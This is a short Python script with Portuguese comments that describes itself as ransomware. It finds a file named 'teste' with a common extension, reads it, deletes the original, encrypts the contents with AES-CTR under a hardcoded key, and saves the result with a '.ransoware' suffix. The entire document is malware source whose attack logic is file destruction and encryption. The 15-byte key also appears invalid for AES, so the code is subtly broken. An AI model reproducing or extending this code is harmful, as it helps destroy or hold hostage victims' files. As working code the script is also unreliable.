import os
import pyaes

# Lista de extensões que o ransomware pode usar
extensions = ['.txt', '.docx', '.pdf', '.jpg', '.png', '.ransoware']  # Adicione outras extensões, se necessário

# Procurar o arquivo a ser criptografado
file_name = None
for ext in extensions:
    possible_file = f'teste{ext}'  # Substitua 'teste' pelo prefixo base do arquivo
    if os.path.exists(possible_file):
        file_name = possible_file
        break

if file_name is None:
    raise FileNotFoundError("Nenhum arquivo encontrado com as extensões fornecidas.")

# Abrir o arquivo a ser criptografado
with open(file_name, 'rb') as file:
    file_data = file.read()

# Remover o arquivo original
os.remove(file_name)

# Definir a chave de criptografia
key = b"testeransowares"
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografar o arquivo
crypto_data = aes.encrypt(file_data)

# Salvar o arquivo criptografado
new_file = file_name + '.ransoware'
with open(new_file, 'wb') as file:
    file.write(crypto_data)

print(f"Arquivo criptografado salvo como: {new_file}")
